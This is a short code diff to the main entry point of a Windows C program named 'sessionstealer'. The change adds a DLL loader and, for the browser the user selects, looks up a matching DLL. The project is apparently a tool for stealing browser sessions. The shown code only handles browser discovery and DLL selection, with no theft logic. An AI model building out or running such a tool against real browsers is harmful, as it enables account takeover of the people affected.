@@ -1,6 +1,7 @@
 #include "sessionstealer/version.h"
 #include "sessionstealer/cli_args.h"
 #include "sessionstealer/utils.h"
+#include "sessionstealer/dll_loader.h"
 #include "dlls/discovery/discovery.h"
 
 #include <stdlib.h>
@@ -8,7 +9,7 @@
 #include <stdbool.h>
 #include <windows.h>
 
-discovery_browser_name_t browser_map[] = {
+static discovery_browser_name_t browser_map[] = {
     [CLI_BROWSER_CHROME]  = DISCOVERY_CHROME,
     [CLI_BROWSER_EDGE]    = DISCOVERY_EDGE,
     [CLI_BROWSER_FIREFOX] = DISCOVERY_FIREFOX
@@ -85,5 +86,11 @@ int main(int argc, char *argv[]) {
         selected_browser = &discovered_browsers.browsers[input];
     }
 
-    return 0;
+    const char *selected_browser_dll_name = find_dll_browser(selected_browser->browser_name);
+    if (!selected_browser_dll_name) {
+        printf("Dll for selected browser was not found, install %s\n", browser_map_dll[selected_browser->browser_name]);
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
 }
